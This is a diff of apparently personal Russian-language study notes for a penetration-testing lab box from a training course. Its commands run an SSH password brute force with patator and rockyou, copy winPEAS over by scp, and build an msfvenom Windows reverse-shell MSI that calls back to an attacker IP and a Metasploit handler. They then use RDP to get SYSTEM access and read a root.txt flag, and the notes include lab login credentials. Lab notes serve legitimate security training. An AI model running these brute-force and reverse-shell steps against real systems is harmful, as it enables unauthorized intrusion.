@@ -35,3 +35,53 @@ https://cybered-my.sharepoint.com/personal/v_karmanov_cyber-ed_ru/_layouts/15/on
 
     Логин: helpdesk
     Пароль: Qwerty123
+
+
+***********************************************************************************************************************************
+ssh_login john password butterfly1
+
+# 0 - указать путь до файла. Если он в этой директории, то ничего не надо, только имя файла
+patator ssh_login host=192.168.56.103 user=john password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Authentication failed.'
+
+butterfly1
+
+5. Передадим файл на удаленную машину по SSH с помощью scp и запустим файл:
+
+$ scp winPEASx64.exe john@10.8.0.14:C:\\Users\\John\\
+
+# интересно
+C:\Users\john\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt
+
+# готовим обратный шел (shell) с нагрузкой (payload) windows/x64/shell_reverse_tcp
+# -o указать путь и имя файла
+─$ msfvenom -platform windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f msi -o rev.msi
+
+
+# подготовка metasploit framework
+# msf6 > search multi/handler
+#  5  exploit/multi/handler                                                 manual     No     Generic Payload Handler
+msf6 exploit(multi/handler) > 
+# options : set lhost 192.168.56.100 (наш ip)
+# msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
+# windows/x64/shell_reverse_tcp - указано при создании нагрузки с помощью msfvenom
+run
+
+# данный вариант подходит если мы не можем запустить через командную строку нашу нагруззку
+12. Подключимся к удаленной системе по RDP, используя xfreerdp – свободный RDP-клиент с консольным интерфейсом, укажем пользователя, пароль, хост и удобную нам ширину экрана:
+
+$ xfreerdp /u:john /p:butterfly1 /w:768 /v:192.168.56.103
+# перед запуском запустит msf6 exploit(multi/handler) >run
+запуск в ручную rev.msi
+
+готово. доступ к cmd с правами system
+# вывод содержания файла в cmd  type file.txt
+type root.txt
+
+
+
+
+
+
+
+
+
